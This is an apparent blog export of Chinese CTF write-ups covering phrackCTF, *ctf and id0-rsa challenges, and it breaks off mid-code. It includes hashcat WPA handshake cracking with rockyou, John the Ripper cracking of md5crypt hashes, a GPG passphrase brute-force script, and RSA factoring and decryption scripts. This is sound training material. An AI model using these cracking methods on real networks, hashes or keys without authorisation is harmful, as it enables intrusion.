神秘的文件file/binwalk指令得到这是一个exT文件系统数据，strings结果也奇怪 索性打开文件看，发现有一堆\x00 但是往下翻发现有些其他东西 然后找到P/C/T，想着能不能移除\x00得到flag 然后的确得到了，但是结果失败了 因为错位包括前后错位，所以直接拼凑也是会失败的 看来还是需要文件系统，用命令 mount -o loop haha.f38a74f55b4e193561d1b707211cf7eb /mnt 装载文件系统之后，发现每个文件里一个字符，所以写出脚本 1234567import oss = ""for i in range(0, 254): f = open(str(i), "r") s += f.read() f.close()print(s) 得到flag flagPCTF{P13c3_7oghter_i7} [Ｘ] 公倍数1s大概做1e8的计算，所以可以直接暴力算就好 代码就没必要放了吧~ flagPCTF{233333333166666668} [Ｘ] Easy Crackme 算法很简单，第一位异或以后，后面24位每6位一组和对应位置异或，然后进行比较 写出逆算法 12345678910111213141516#include &lt;bits/stdc++.h&gt;using namespace std;unsigned char a[27] = &#123; 0xFB, 0x9E, 0x67, 0x12, 0x4E, 0x9D, 0x98, 0xAB, 0x00, 0x06, 0x46, 0x8A, 0xF4, 0xB4, 0x06, 0x0B, 0x43, 0xDC, 0xD9, 0xA4, 0x6C, 0x31, 0x74, 0x9C, 0xD2, 0xA0, 0&#125;;int ar[6] = &#123;-35,51,84,53,-17,-85&#125;;int main()&#123; a[0]^=0xab; for(int i=0;i&lt;25;++i)&#123; a[i+1]^=ar[i%6]; &#125; puts((const char *)a); return 0;&#125; flagPCTF{r3v3Rse_i5_v3ry_eAsy} [Ｘ] Secret打开，F12，网络，刷新，得到 flagPCTF{Welcome_to_phrackCTF_2016} [Ｘ] 爱吃培根的出题人提示够明显了，小写字母-&gt;A，大写字母-&gt;B，培根密码解密 flag[Ｘ] Easy RSA提示明显 flagPCTF{3a5Y} [Ｘ] ROPGadget flagPCTF{94C38B08890A5BC3} [Ｘ] 取证搜索得软件名Volatility flagPCTF{volatility} [Ｘ] 熟悉的声音摩尔斯-&gt;凯撒 flagPCTF{PHRACKCTF} [Ｘ] Baby’s Crack很简单的加密，都不用写逆算法了，直接爆破吧！ 123456789101112131415161718192021222324252627282930#include &lt;string.h&gt;#include &lt;stdio.h&gt;char a[] = "jeihjiiklwjnk&#123;ljj&#123;kflghhj&#123;ilk&#123;k&#123;kij&#123;ihlgkfkhkwhhjgly";char b[] = "jeihjiiklwjnk&#123;ljj&#123;kflghhj&#123;ilk&#123;k&#123;kij&#123;ihlgkfkhkwhhjgly";//这里可以为空，我只是方便设置长度搞得int main()&#123; int len = strlen(a); for(int i=0;i&lt;len;++i)&#123; int ok = 0; for(int j=32;j&lt;255&amp;&amp;!ok;++j)&#123; int cur = j; if ( j &gt; 47 &amp;&amp; j &lt;= 96 )&#123; j += 53; &#125;else if ( j &lt;= 46 )&#123; j += j % 11; &#125;else&#123; j = 61 * (j / 61); &#125; if(j==a[i])&#123; //ok=1;这里加上注释是为了确认每次解的唯一 b[i]=cur; putchar(cur); &#125; j=cur; &#125; putchar('\n'); &#125; puts(b); return 0;&#125; 得到的结果转ASCII就好 flagPCTF{You_ar3_Good_Crack3R} [Ｘ] Help!! 打开word没有发现flag，binwalk/strings也没有 于是解压word，发现有两张图，OK flagPCTF{You_Know_moR3_4boUt_woRd} [Ｘ] Shellcode flagPCTF{Begin_4_good_pwnn3r} [Ｘ] A Piece Of Cake一眼就看出来是单表替换，quip解决 flagPCTF{substitutepassisveryeasyyougotit} [Ｘ] -.-字符串一目了然 flag522018D665387D1DA931812B77763410 [Ｘ] 德军的密码 然后解得flag flagWELCOMECISRG [Ｘ] 握手包下载发现是个cap包，中文搜索无果，搜”Kali handshake crack”，搜到hashcat，找到这个网站 照葫芦画瓢 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263A:\Downloads\Compressed\hashcat-4.1.0λ hashcat64.exe -m 2500 9640_1525972232.hccapx rockyou.txthashcat (v4.1.0) starting...* Device #1: WARNING! Kernel exec timeout is not disabled. This may cause "CL_OUT_OF_RESOURCES" or related errors. To disable the timeout, see: https://hashcat.net/q/timeoutpatch* Device #2: Intel's OpenCL runtime (GPU only) is currently broken. We are waiting for updated OpenCL drivers from Intel. You can use --force to override, but do not report related errors.nvmlDeviceGetFanSpeed(): Not SupportedOpenCL Platform #1: NVIDIA Corporation======================================* Device #1: GeForce GTX 965M, 512/2048 MB allocatable, 8MCUOpenCL Platform #2: Intel(R) Corporation========================================* Device #2: Intel(R) HD Graphics 530, skipped.* Device #3: Intel(R) Core(TM) i7-6700HQ CPU @ 2.60GHz, skipped.Hashes: 1 digests; 1 unique digests, 1 unique saltsBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotatesRules: 1Applicable optimizers:* Zero-Byte* Single-Hash* Single-Salt* Slow-Hash-SIMD-LOOPMinimum password length supported by kernel: 8Maximum password length supported by kernel: 63Watchdog: Temperature abort trigger set to 90cDictionary cache built:* Filename..: rockyou.txt* Passwords.: 14344390* Bytes.....: 139921496* Keyspace..: 14344383* Runtime...: 3 secse56452df7244988624af174fa692d81d:560a64ffe917:b8ee65ac640b:Flag_is_here:11223344Session..........: hashcatStatus...........: CrackedHash.Type........: WPA/WPA2Hash.Target......: Flag_is_here (AP:56:0a:64:ff:e9:17 STA:b8:ee:65:ac:64:0b)Time.Started.....: Fri May 11 01:17:21 2018 (3 secs)Time.Estimated...: Fri May 11 01:17:24 2018 (0 secs)Guess.Base.......: File (rockyou.txt)Guess.Queue......: 1/1 (100.00%)Speed.Dev.#1.....: 91621 H/s (10.79ms) @ Accel:32 Loops:16 Thr:1024 Vec:1Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) SaltsProgress.........: 593466/14344383 (4.14%)Rejected.........: 331322/593466 (55.83%)Restore.Point....: 0/14344383 (0.00%)Candidates.#1....: 123456789 -&gt; rinabelleHWMon.Dev.#1.....: Temp: 68c Util: 98% Core:1151MHz Mem:2505MHz Bus:16Started: Fri May 11 01:17:04 2018Stopped: Fri May 11 01:17:25 2018 flagflag{11223344} [ ] Crypto[Ｘ] Medium RSA1234567891011121314λ openssl rsa -pubin -in pubkey.pem -text -modulusWARNING: can't open config file: /usr/local/ssl/openssl.cnfPublic-Key: (256 bit)Modulus: 00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f: 1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f: be:30:ddExponent: 65537 (0x10001)Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DDwriting RSA key-----BEGIN PUBLIC KEY-----MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDryigb/+l/vjDdAgMBAAE=-----END PUBLIC KEY----- 然后分解这个数，用RSAtools输出私钥文件 12345678910111213141516λ python rsatool.py -f PEM -o key.pem -p 275127860351348928173285174381581152299 -q 319576316814478949870590164193048 041239Using (p, q) to initialise RSA instancen =c2636ae5c3d8e43ffb97ab09028f1aac6c0bf6cd3d70ebca281bffe97fbe30dde = 65537 (0x10001)d =1806799bd44ce649122b78b43060c786f8b77fb1593e0842da063ba0d8728bf1p = 275127860351348928173285174381581152299 (0xcefbb2cf7e18a98ebedc36e3e7c3b02b)q = 319576316814478949870590164193048041239 (0xf06c28e91c8922b9c236e23560c09717)Saving PEM as key.pem 之后解密 λ openssl rsautl -decrypt -inkey key.pem -in flag.enc -out flag flagPCTF{256b_i5_m3dium} [ ] BrokenPicflag[Ｘ] hard RSA RSA 衍生算法——Rabin 算法攻击条件Rabin 算法的特征在于 $e=2$。 攻击原理密文： $c=m^2modn$ 解密： 计算出 $m^p$ 和 $m^q$： $$m_p=\sqrt{c}modp$$ $$m_q=\sqrt{c}modq$$ 用扩展欧几里得计算出 $y_p$ 和 $y_q$： $y_p⋅p+y_q⋅q=1$ 解出四个明文： $$a=(y_p⋅p⋅m_q+y_q⋅q⋅m_p)modn$$ $$b=n−a$$ $$c=(y_p⋅p⋅m_q−y_q⋅q⋅m_p)modn$$ $$d=n−c$$ 注意：如果 $$p≡q≡3(mod4)$$，则 $$mp=c^{\frac{1}{4}(p+1)}modp$$ $$mq=c^{\frac14(q+1)}modq$$ 而一般情况下，$p≡q≡3(mod4)p $是满足的，对于不满足的情况下，请参考相应的算法解决。 1234567891011121314151617181920212223242526272829303132333435363738#!/usr/bin/python# coding=utf-8import gmpy2import stringfrom Crypto.PublicKey import RSA# 读取公钥参数with open('pubkey.pem', 'r') as f: key = RSA.importKey(f) N = key.n e = key.ewith open('flag.enc', 'r') as f: cipher = f.read().encode('hex') cipher = string.atoi(cipher, base=16) # print cipherprint "please input p"p = int(raw_input(), 10)print 'please input q'q = int(raw_input(), 10)# 计算yp和yqinv_p = gmpy2.invert(p, q)inv_q = gmpy2.invert(q, p)# 计算mp和mqmp = pow(cipher, (p + 1) / 4, p)mq = pow(cipher, (q + 1) / 4, q)# 计算a,b,c,da = (inv_p * p * mq + inv_q * q * mp) % Nb = N - int(a)c = (inv_p * p * mq - inv_q * q * mp) % Nd = N - int(c)for i in (a, b, c, d): s = '%x' % i if len(s) % 2 != 0: s = '0' + s print s.decode('hex') flagPCTF{sp3ci4l_rsa}]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Crypto</tag>
        <tag>Misc</tag>
        <tag>PWN</tag>
        <tag>Web</tag>
        <tag>Rev</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[*ctf magic_number WP]]></title>
    <url>%2F2018%2F04%2F27%2Fctf-magic-number-WP%2F</url>
    <content type="text"><![CDATA[99次内猜14个[0,1023]内的数，那肯定是不仅二分而且要整体二分了 简单说来是 于是可以写出代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566#!/bin/python3from pwn import *r = remote("47.89.18.224", 10011)nums = []def query(l, r, rm): """ Send the query and get answer :param l: &lt;int&gt; left bound :param r: &lt;int&gt; Right bound :param rm: &lt;remote&gt; Remote process :return: Amount of numbers """ payload ="? " + str(l) + " " + str(r) + "\n" rm.send(payload) res = int(rm.recv()) print payload + str(res) return resdef find(l, r, k, rm): """ Guess numbers :param l: &lt;int&gt; Left bound :param r: &lt;int&gt; Right bound :param k: &lt;int&gt; Amount of numbers :param rm: &lt;remote&gt; Remote process :return: None """ global nums if l == r - 1 and k == 1: nums.append(l) return None m = (l + r) // 2 K = query(l, m, rm) if K: find(l, m, K, rm) if K - k: find(m, r, k - K, rm)def gate(rm): """ gate :param rm: &lt;remote&gt; Remote process :return: None """ global nums rm.recvuntil("n = ") k = int(rm.recv()) nums = [] find(0, 1024, k, r) nums.sort() print(nums) rm.interactive()gate(r)gate(r)gate(r)# 这里gate(r)一次就过一关，多少关我也忘了]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>PPC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[id0-rsa WP合集]]></title>
    <url>%2F2018%2F04%2F19%2Fid0-rsa-WP%E5%90%88%E9%9B%86%2F</url>
    <content type="text"><![CDATA[忙里偷闲做做题wwwwwwwwwwwww 进度表 Intro to Hashing Intro to PGP Hello PGP Hello OpenSSL Intro to RSA Caesar Hello Bitcoin Ps and Qs Affine Cipher Cut and Paste Attack On AES-ECB Rail Fence Factoring RSA With CRT Optimization Easy Passwords RSA Modulus Factorization Fast Hashing Passwords Vigenère Monoalphabetic Cipher Salt Alone Won’t Save You CCA on Textbook RSA AES-CTR with Nonce Reuse Bad Entropy Double Strength Affine Rainbow Table Hash Chain Elliptic Curve Private Key Recovery ECDSA Nonce Recovery Slightly harder passwords Upgraded Affine Fvtavat Xrl Erpbirel Insufficient Key Size Håstad’s Broadcast Attack CBC Padding Attack Breaking PDF Passwords Vigenère + Rail Fence Recover the secret phone number Optimal Backpack Allocation Insecure PRNG Playfair CRIMEs against TLS Bleichenbacher’s CCA2 on RSA Backdoored PRNG Not So Safe Primes DSA with LCG nonces Intro to Hashing12345# Python&gt;&gt;&gt; import hashlib&gt;&gt;&gt; hashlib.md5(hashlib.sha256('id0-rsa.pub').hexdigest()).hexdigest()# 'b25d449d86aa07981d358d3b71b891de' Intro to PGP1234567891011# bashroot@kali:~/Documents/id0-rsa# touch Intro_to_PGP.keyroot@kali:~/Documents/id0-rsa# gpg --import Intro_to_PGP.key gpg: key 2503D0F1A81B09D4: public key "id0-rsa.pub (http://id0-rsa.pub) &lt;id0rsa.pub@gmail.com&gt;" importedgpg: Total number processed: 1gpg: imported: 1root@kali:~/Documents/id0-rsa# touch Intro_to_PGP.txtroot@kali:~/Documents/id0-rsa# gpg -d Intro_to_PGP.txt# Thank you Phil Zimmermann! Hello PGP123456789101112131415161718192021#!/bin/bashcount=1while read WORD; do gpg --batch --passphrase $WORD --decrypt test.txt 2&gt;/dev/null if [ $? -eq 0 ]; then echo echo $WORD exit fi count=$(( count + 1 )) if [ $((count % 1000)) -eq 0 ]; then echo $count fidone &lt; words# passionately apathetic# seamanship# gpg: AES256 encrypted data# gpg: encrypted with 1 passphrase Hello OpenSSL繁琐的解法12345678910111213141516171819202122232425262728293031323334# bashroot@kali:~/Documents/id0-rsa/Hello_OpenSSL# openssl rsa -in priva.pem -textPrivate-Key: (256 bit)modulus: 00:e6:dc:a0:a5:26:5d:39:95:0c:7e:e3:b7:a1:31: 96:47:87:00:2c:1b:56:ba:2e:54:ce:b4:30:db:ff: 09:95:9dpublicExponent: 65537 (0x10001)privateExponent: 00:8f:67:e1:8a:75:28:57:ca:94:76:85:f1:dd:79: b6:05:0e:35:05:e7:f9:ed:da:23:e6:de:14:aa:22: d9:78:a9prime1: 00:fd:99:07:3e:67:03:c1:72:2a:96:81:ab:9a:29: db:d7prime2: 00:e9:0c:76:fe:de:98:c1:9d:d3:c8:30:c0:e4:3a: 8b:abexponent1: 00:b4:a6:37:17:c7:d0:50:14:20:ac:58:30:c2:c0: 00:bfexponent2: 00:c5:87:27:25:07:8e:fa:2c:c7:e0:9a:52:24:1f: eb:59coefficient: 00:e3:bd:9b:a2:47:11:68:33:2d:80:fe:7d:ed:34: de:fcwriting RSA key-----BEGIN RSA PRIVATE KEY-----MIGtAgEAAiEA5tygpSZdOZUMfuO3oTGWR4cALBtWui5UzrQw2/8JlZ0CAwEAAQIhAI9n4Yp1KFfKlHaF8d15tgUONQXn+e3aI+beFKoi2XipAhEA/ZkHPmcDwXIqloGrminb1wIRAOkMdv7emMGd08gwwOQ6i6sCEQC0pjcXx9BQFCCsWDDCwAC/AhEAxYcnJQeO+izH4JpSJB/rWQIRAOO9m6JHEWgzLYD+fe003vw=-----END RSA PRIVATE KEY----- 123456789# Python&gt;&gt;&gt; n = 0xe6dca0a5265d39950c7ee3b7a131964787002c1b56ba2e54ceb430dbff09959d&gt;&gt;&gt; d = 0x8f67e18a752857ca947685f1dd79b6050e3505e7f9edda23e6de14aa22d978a9&gt;&gt;&gt; c = 0x6794893f3c47247262e95fbed846e1a623fc67b1dd96e13c7f9fc3b880642e42&gt;&gt;&gt; hex(pow(c,d,n))'0x310f2eb0634ed1ab' 一行123# bashroot@kali:~/Documents/id0-rsa/Hello_OpenSSL# openssl rsautl -decrypt -in &lt;(xxd -r -p cipher) -inkey priva.pem -raw | xxd -p -c 8 | tail -n1# 310f2eb0634ed1ab Intro to RSA12345678# Python&gt;&gt;&gt; (e, N) = (0x3, 0x64ac4671cb4401e906cd273a2ecbc679f55b879f0ecb25eefcb377ac724ee3b1)&gt;&gt;&gt; d = 0x431d844bdcd801460488c4d17487d9a5ccc95698301d6ab2e218e4b575d52ea3&gt;&gt;&gt; c = 0x599f55a1b0520a19233c169b8c339f10695f9e61c92bd8fd3c17c8bba0d5677e&gt;&gt;&gt; hex(pow(c,d,N))'0x4d801868d894740b2be29309fcd3edcd51bd2c2a685028b89290f9268c727581' Caesar 但是交了以后就显示错误，不知道为什么…… 破案了，因为凯撒之后的原文是 Hello Bitcoin按资料算就是了 然而我找到了在线计算的工具;D 按照比特币wiki的说法，计算过程大概是这样的： 首先我们生成一个私钥 获取对应的公钥 获得公钥的SHA256散列值 获取上一步结果的RIPEMD-160散列值 在散列值前加入版本号 计算上一步结果的SHA-256散列 取第二个SHA-256散列值的前四字节作为地址校验和 在第四步的结果末尾加入校验和 进行Base28编码 You already solved this one! Solution: 18GZRs5nx8sVhF1xVAaEjKrYJga4hMbYc2 Ps and Qsfactordb.com 完成 噫，年老体衰也就算了，眼神也不好了，其实没有分解成功 然后开了个yafu，结果还是很不错的，我做出来了以后依然没有分解出答案 先是打开题目看了下，说是生成的素数low entropy(低熵)吗，然后打开论文大概看了下，就说生成素数有毛病，就猜测是不是共同素数的锅 结果还真是 先读两个公钥，然后gcd了一波，成功 123456789# pythondef gcd(a, b): if b == 0: return a else: return gcd(b, a%b)#q = gcd(3367646059138877442579820972831876412006279917097809082279412851693123955964282545145500497393579598954859534731890460229194372339215098506788375050698427369, 9055404640500300109405801152935663267176218320785348541566663982172162265778445107320065187449062375525002632043722734566593185461999286625234528036605141)#print(q) 然后懒得写求拓展欧几里得求逆元了，直接拿工具了 补全代码 123456789101112131415161718192021# pythondef gcd(a, b): if b == 0: return a else: return gcd(b, a%b)#q = gcd(3367646059138877442579820972831876412006279917097809082279412851693123955964282545145500497393579598954859534731890460229194372339215098506788375050698427369, 9055404640500300109405801152935663267176218320785348541566663982172162265778445107320065187449062375525002632043722734566593185461999286625234528036605141)#print(q)#print(9055404640500300109405801152935663267176218320785348541566663982172162265778445107320065187449062375525002632043722734566593185461999286625234528036605141//q)n = 9055404640500300109405801152935663267176218320785348541566663982172162265778445107320065187449062375525002632043722734566593185461999286625234528036605141d = 5595429548525262877923879998920954875376781621351655927785581040054379710925982991727871918848397312612397095534700830662119225899345003601005897300178945c = 0xf5ed9da29d8d260f22657e091f34eb930bc42f26f1e023f863ba13bee39071d1ea988ca62b9ad59d4f234fa7d682e22ce3194bbe5b801df3bd976db06b944daprint(hex(pow(c,d,n))[2:])# f6a1df363229c6ec Affine Cipher暴力一下肉眼看吧 是的，暴力以后搜索THE，出现次数最多的那个基本就确定了 不过得感叹一下 ……自己越来越蠢了……求个逆元，不是a*b%c==1则mod c下ab互为逆元么，我™a的b次方是要闹哪样…… 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152# pythonplain = "BOHHIKBI,OZ,REI,WZRIKZIR,EX.,BOHI,RO,KISU,XSHO.R,ICBSG.WYISU,OZ, WZXZBWXS,WZ.RWRGRWOZ.,.IKYWZP,X.RKG.RIT,REWKT,DXKRWI.,RO,DKOBI..,ISIBRKOZWB,DXUHIZR.F,NEWSI,REI,.U.RIH,NOKA.,NISS,IZOGPE, OKHO.R,RKXZ.XBRWOZ.Q,WR,.RWSS,.G IK., KOH,REI,WZEIKIZR,NIXAZI..I.,O ,REI,RKG.R,MX.IT,HOTISF,BOHDSIRISU,ZOZKIYIK.WMSI,RKXZ.XBRWOZ.,XKI,ZOR,KIXSSU,DO..WMSIQ,.WZBI, WZXZBWXS,WZ.RWRGRWOZ.,BXZZORXYOWT,HITWXRWZP,TW.DGRI.F,REI,BO.R,O ,HITWXRWOZ,WZBKIX.I.,RKXZ.XBRWOZ,BO.R.Q,SWHWRWZP,REIHWZWHGH,DKXBRWBXS,RKXZ.XBRWOZ,.WJI,XZT,BGRRWZP,O ,REI,DO..WMWSWRU, OK,.HXSS,BX.GXS,RKXZ.XBRWOZ.QXZT,REIKI,W.,X,MKOXTIK,BO.R,WZ,REI,SO..,O ,XMWSWRU,RO,HXAI,ZOZKIYIK.WMSI,DXUHIZR., OK,ZOZKIYIK.WMSI.IKYWBI.F,NWRE,REI,DO..WMWSWRU,O ,KIYIK.XSQ,REI,ZIIT, OK,RKG.R,.DKIXT.F,HIKBEXZR.,HG.RMI,NXKU,O ,REIWK,BG.ROHIK.Q,EX..SWZP,REIH, OK,HOKI,WZ OKHXRWOZ,REXZ,REIU,NOGST,OREIKNW.I,ZIITF,X,BIKRXWZ,DIKBIZRXPI,O , KXGT,W.,XBBIDRIT,X.,GZXYOWTXMSIF,REI.I,BO.R.,XZT,DXUHIZR,GZBIKRXWZRWI.BXZ,MI,XYOWTIT,WZ,DIK.OZ,MU,G.WZP,DEU.WBXS,BGKKIZBUQ,MGR,ZO,HIBEXZW.H,ICW.R.,RO,HXAI,DXUHIZR.OYIK,X,BOHHGZWBXRWOZ.,BEXZZIS,NWREOGR,X,RKG.RIT,DXKRUF"mp = "ABCDEFGHIJKLMNOPQRSTUVWXYZ ,."dict = &#123;&#125;inv_dict = &#123;&#125;for i in range(0, len(mp)): dict[i] = mp[i] dict[mp[i]] = i# print(dict)for i in range(1, 29): for j in range(1, 29): if i*j%29 == 1: inv_dict[i] = j breakprint(inv_dict)newarr = []for i in range(0, len(plain)): newarr.append(dict[plain[i]])# print(newarr)def decry(c, a, b): s = "" for i in range(0, len(c)): s += dict[(c[i]-b+29)*inv_dict[a]%29] return sfor i in range(1, 29): for j in range(0, 29): print(decry(newarr, i, j)) print(i, j)for j in range(0, 29): print(decry(newarr, 0, j)) print(0, j)# plain = "RLZZC SCIZJB"## newarr = []## for i in range(0, len(plain)):# newarr.append(dict[plain[i]])## print(decry(newarr, 2, 3)) 1234567λ pythonPython 3.6.1 on win32Type "help", "copyright", "credits" or "license" for more information.&gt;&gt;&gt; import hashlib&gt;&gt;&gt; plain = "COMMERCE ON THE INTERNET HAS COME TO RELY ALMOST EXCLUSIVELY ON FINANCIAL INSTITUTIONS SERVING ASTRUSTED THIRD PARTIES TO PROCESS ELECTRONIC PAYMENTS. WHILE THE SYSTEM WORKS WELL ENOUGH FORMOST TRANSACTIONS, IT STILL SUFFERS FROM THE INHERENT WEAKNESSES OF THE TRUST BASED MODEL. COMPLETELY NONREVERSIBLE TRANSACTIONS ARE NOT REALLY POSSIBLE, SINCE FINANCIAL INSTITUTIONS CANNOTAVOID MEDIATING DISPUTES. THE COST OF MEDIATION INCREASES TRANSACTION COSTS, LIMITING THEMINIMUM PRACTICAL TRANSACTION SIZE AND CUTTING OFF THE POSSIBILITY FOR SMALL CASUAL TRANSACTIONS,AND THERE IS A BROADER COST IN THE LOSS OF ABILITY TO MAKE NONREVERSIBLE PAYMENTS FOR NONREVERSIBLESERVICES. WITH THE POSSIBILITY OF REVERSAL, THE NEED FOR TRUST SPREADS. MERCHANTS MUSTBE WARY OF THEIR CUSTOMERS, HASSLING THEM FOR MORE INFORMATION THAN THEY WOULD OTHERWISE NEED. A CERTAIN PERCENTAGE OF FRAUD IS ACCEPTED AS UNAVOIDABLE. THESE COSTS AND PAYMENT UNCERTAINTIESCAN BE AVOIDED IN PERSON BY USING PHYSICAL CURRENCY, BUT NO MECHANISM EXISTS TO MAKE PAYMENTSOVER A COMMUNICATIONS CHANNEL WITHOUT A TRUSTED PARTY."&gt;&gt;&gt; hashlib.md5(plain.encode()).hexdigest()'880cabd53df2f03050a7214d3ae30a07' Cut and Paste Attack On AES-ECB截取一哈就行 ECB的问题就在于同样的明文总是对应相同的密文，而AES又是分组加密，所以我们只需要16字节截一段，然后从截出来的字段里拼出Deposit amount: One million dollars就吼啦 然后把对应的密文组合提交就好啦 Rail Fence栅栏密码 不是栅栏密码，丢人 就是这个名字，密码是17 然而提交又失败……是不是要加空格？？？ 和凯撒那题一样的问题 Factoring RSA With CRT Optimization看看论文 论文结论放得挺快的，喜欢 1234567891011121314151617181920&gt;&gt;&gt; e = 0x10001&gt;&gt;&gt; n = 0x90def3c2c91ae9bf6089ec8857960d567fdbcd7c2c3ea713046977231e65f44e1b91550971d4e5d43b51675fae4ba640add3af02dad4bf68c3ddef3a98907e1e01156de7a4474d9fce2ba8c055f44673c703a72a111a06f8a7b2fe582463938d802e91630e1e1b5483b1774e608eb4368c6bbf4da375319d9a2799bf8a5ae453&gt;&gt;&gt; x = 0xdeadc0de&gt;&gt;&gt; y = 0x17d7f90a4597fb2bbbb41d1a70f505f0d8c5cb53faaafea259150eb6910fb08fbf1ba40e42de70c596fb0032d132c9c6ce46c650999ad5f14a990d205984260146e2949b819dc8732beceed452701d88b2c8723b410fce739009df89930424c566af5102403981c26c3e75d9c62065a347e815b26984dcd3b5f02fc8a8092051&gt;&gt;&gt; def gcd(a,b):... if b == 0:... return a... else:... return gcd(b,a%b)...&gt;&gt;&gt; gcd(pow(y,e,n)-x,n)9966524937284363425885222065976539626835093420150865305435384403545526100948308275937186399398105835105908301433416877915451315435074364352622884631548129&gt;&gt;&gt; p = gcd(pow(y,e,n)-x,n)&gt;&gt;&gt; q = n//p&gt;&gt;&gt; n%p0&gt;&gt;&gt; print(p)9966524937284363425885222065976539626835093420150865305435384403545526100948308275937186399398105835105908301433416877915451315435074364352622884631548129&gt;&gt;&gt; print(q)10207350221528968021374239537567355734439270587735020516681487302155761468885207397982418037573103389660473080952277752719230542349569271803978030721660851 Easy Passwords暴力/去他们推特看看 Hint for 1: the “easy” passwords are all standard English words 很惭愧，原本没思路的，又学习了一下别人怎么用John the Ripper的 123456789101112131415161718192021222324252627282930313233343536root@kali:~# touch crackitroot@kali:~# john --wordlist=/usr/share/dict/words crackit Created directory: /root/.johnWarning: detected hash type "md5crypt", but the string is also recognized as "aix-smd5"Use the "--format=aix-smd5" option to force loading these as that type insteadUsing default input encoding: UTF-8Loaded 10 password hashes with no different salts (md5crypt, crypt(3) $1$ [MD5 128/128 SSE2 4x3])Press 'q' or Ctrl-C to abort, almost any other key for statuseach (?)in (?)letter (?)list (?)of (?)order (?)second (?)the (?)this (?)word (?)10g 0:00:00:04 DONE (2018-05-07 07:53) 2.421g/s 24502p/s 24502c/s 176147C/s woolly..word'sWarning: passwords printed above might not be all those cracked# 这里直接看是不知道交什么的，id0-rsa好像都是这样做的root@kali:~# john --show crackit?:the?:second?:letter?:of?:each?:word?:in?:this?:list?:in?:order11 password hashes cracked, 0 left RSA Modulus Factorization有公钥、私钥，分解N 有人提示 You may want to look at end of section 1 of this paper to get an idea of how to tackle this. 但是懒人选择直接用工具 123456789101112131415λ python rsatool.py -f PEM key.pem -n 2575379069244619122811590270693932708961682118615086945187580561953482470842235 5391264253236312033342930767629026955594380914791828872789640882880456756317355718989951748134910495292317107822354638062542536621806610548119524360577494257082085388892230653871347635789064083634194556923152378748383913055689941464591534636606264605505256200032003073128045380287795929441895659897956729518691264242454587153279087011099643014705274937963488514996712634166563179373202236856266518026166326484283485368106496495400924862033175617707157820195751946135848383888076352630565287208026865192435711425148588227314034233872575399 -d 17105402368913594732268140576016021009260884834703468214454459966320267707293844817833310635571150638333054368126620841170740802501167335402566350357845884586982802288930597441429262542859551082213714762867946512961388972561696317770839625342858127315991460791480206023627821121730752214777828377914024156239192555174948311918712437146465305330571121417401154082076772433310857936602097318370602240544385942653856271345622469333448979309288295132145434251447399809135938564905989171217097472641153308592366164932415033656821923922166211242186853476413476873462490965233576571621275866183349806774845359965178419609761Using (n, d) to initialise RSA instancen =cc0262c3764f6d1bfa485a88c0566a6d68cb89ac382fbbc577a4862bdbce111bb59960ea787f132e3fddb9c914d0d11d156dd433a2adab9084d48cf58f58b42804805966ecd318ad19218791e14e19a8d0cf3441e219e5e1395eb5dba1fba11d94321a34eb536c51f4c44c5987e74a467b5fe2eae8d2725d63f24feebfd9ca746de93b6fd74ed82fed7dbfc3a84b0a425f52503ab71908a13ac11a9d52211042290ae2886626f67935dc78b7d86ba76d3c5e085a003dff06f914187acc368f904613cbd3d52f36c8b0535f9dfeec2737744ad8be51f66e1d470261a7fd7c6da277dbd2f213b44d9e8242a8a5b121acc8710baed3d244004e4ca560d58e756ba7e = 65537 (0x10001)d =87803a2b0b44dbfa8e354a74b41371a2f3cce4c74f965cc85e9c1745c03bd15f2f320d8e0eb4907fd289a9a16642fff1aa4f0577ba6051a8aea12272e3600e60da0489dcf4058dc942fce337c0870841f956f6a59fd085c01f43c9d474755660f81283178d0a1ed31c98d9014a6414105657acb74c26a3316676062354a80a70335a670675f439dec08803def4892c4d99e20fbe1975d7673679ac6f16835307ce59971c865d71edeea9ed1a93c70a37e283f270dea8499271268d86f7fc4a1b4f64041833c62a057dfb0b48f1c4f6d351673238a3de3b4506eb2472aaf90b914e791c3a723464d9169d5eab8e0a3f8a42dedb065829e8b533a89dd3ba0a00a1p =cd8872868e62777d31e8cf8a694df3096bfa246463d4cfbda7f22f31d0b0f2d6d99996a099c79f312915018c475b2a5090f08ffa67400985dbbc8c04466ddf07414b40be264b98f8422ae053dfd53d4845eda2fda826cabb9237bb432f9e99862c6b75aeebc1b79e3a780fd813e05e73c9bbb521c05539e998031c876a2e7497q = fe1a2971eee591830144ccb525befca29aa5a84c7b63510c60a491f09a185a787250bc5ea8c024896a4ec6312a8bf391fe76e15a50d7609cfb27ac18342b7dfd3d20ed94a85d62f83454ea77aa26471881aad95c63b0e890daabc71991f8051c2ec5956f8855a13e34c1e11e3a8d9abc43d813c6f9f42e34e0c75b35d2f15371 Fast Hashing Passwords母鸡 就是给了一个简单密码表，顺着跑个散列值表，然后排序，找出散列值最大最小的两个 有点考验电脑 Python写的排序那一步会有Memory Error（主要是ACM遗留下来的习惯，写算法写cpp比较习惯） 首先是下载rockyou list，算SHA-256值（其实这里没必要，但是我觉得可能会有用，所以算一个保存着了） 123456789101112131415161718192021import hashlibdef hash(strings): return str(hashlib.sha256(strings).hexdigest())f = open(r"rockyou.txt", "rb")w = open(r"rawsha256.txt", "w")s = f.readline()[:-1]arr = []print(hash("".encode()))i = 1while s != "": w.write(hash(s)+'\n') arr.append(hash(s)) s = f.readline()[:-1]f.close()w.close() 然后排序输出最低最高的位置 123456789101112131415161718192021222324252627#include &lt;bits/stdc++.h&gt;using namespace std;int arr[14344391];vector&lt;string&gt; st;inline bool 